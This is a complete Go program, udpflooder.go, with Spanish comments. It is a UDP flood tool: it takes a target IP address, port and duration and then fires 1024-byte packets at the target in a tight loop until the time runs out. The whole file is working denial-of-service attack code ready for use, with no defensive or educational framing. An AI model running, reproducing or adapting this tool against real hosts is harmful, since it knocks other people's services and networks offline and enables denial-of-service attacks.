package main

import (
	"fmt"
	"net"
	"os"
	"strconv"
	"time"
)

func main() {
	// Obtener los argumentos de la línea de comandos
	if len(os.Args) != 4 {
		fmt.Println("Uso: go run udpflooder.go <ip_objetivo> <puerto_objetivo> <duracion_en_segundos>")
		os.Exit(1)
	}

	targetIp := os.Args[1]
	targetPortStr := os.Args[2]
	durationStr := os.Args[3]

	targetPort, err := strconv.Atoi(targetPortStr)
	if err != nil {
		fmt.Println("Error: El puerto debe ser un número entero.")
		os.Exit(1)
	}

	duration, err := strconv.Atoi(durationStr)
	if err != nil {
		fmt.Println("Error: La duración debe ser un número entero.")
		os.Exit(1)
	}

	// Resolver la dirección del destino
	addr, err := net.ResolveUDPAddr("udp", targetIp+":"+strconv.Itoa(targetPort))
	if err != nil {
		fmt.Println("Error al resolver la dirección:", err)
		os.Exit(1)
	}

	// Crear el socket UDP
	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		fmt.Println("Error al conectar:", err)
		os.Exit(1)
	}
	defer conn.Close() // Asegurarse de cerrar la conexión al final

	// Datos a enviar (puedes cambiar esto)
	data := make([]byte, 1024)
	for i := range data {
		data[i] = 'A'
	}

	fmt.Printf("Iniciando inundación UDP a %s:%d durante %d segundos...\n", targetIp, targetPort, duration)

	startTime := time.Now()

	for time.Since(startTime).Seconds() < float64(duration) {
		_, err := conn.Write(data)
		if err != nil {
			fmt.Println("Error al enviar datos:", err)
		} //else {
		  //	fmt.Println("Enviados bytes") //Esto llenará la terminal rápidamente
		  //}

	}

	fmt.Println("Inundación completada.")
}
